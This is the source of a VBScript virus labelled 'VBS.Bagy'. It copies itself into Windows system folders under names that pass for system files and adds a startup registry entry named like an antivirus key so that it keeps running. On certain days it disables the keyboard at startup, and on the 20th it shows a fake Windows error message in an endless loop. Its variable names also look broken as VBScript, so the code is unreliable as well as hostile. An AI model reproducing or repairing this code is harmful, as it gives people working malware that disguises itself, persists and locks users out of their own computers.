' VBS.Bagy
' by Razorblade 

On Error Resume Next

set 1 = CreateObject("Scripting.FileSystemObject")
set 2 = CreateObject("WScript.Shell")
set 3 = 1.GetFile(WScript.ScriptFullName)

3.Copy("C:\WINDOWS\win32.vbs")
3.Copy("C:\WINDOWS\system32\bagy32.vbs")
3.Copy("C:\WINDOWS\system32\taskmgr.vbs")

On Error Resume Next

2.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\KAV04","C:\WINDOWS\system32\bagy32.vbs","REG_SZ"

if day(now) = 1 then
2.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DisableKeyboard", "Rundll32.exe Keyboard,Disable"
end if

if day(now) = 3 then
2.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DisableKeyboard", "Rundll32.exe Keyboard,Disable"
end if

if day(now) = 5 then
2.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DisableKeyboard", "Rundll32.exe Keyboard,Disable"
end if

if day(now) = 7 then
2.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DisableKeyboard", "Rundll32.exe Keyboard,Disable"
end if

if day(now) = 9 then
2.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DisableKeyboard", "Rundll32.exe Keyboard,Disable"
end if

if day(now) = 11 then
2.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DisableKeyboard", "Rundll32.exe Keyboard,Disable"
end if

if day(now) = 25 then
2.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DisableKeyboard", "Rundll32.exe Keyboard,Disable"
end if

if day(now) = 20 then
do
msgbox "Error.1098! Please reboot your computer","16","Windows"
loop
end if

' end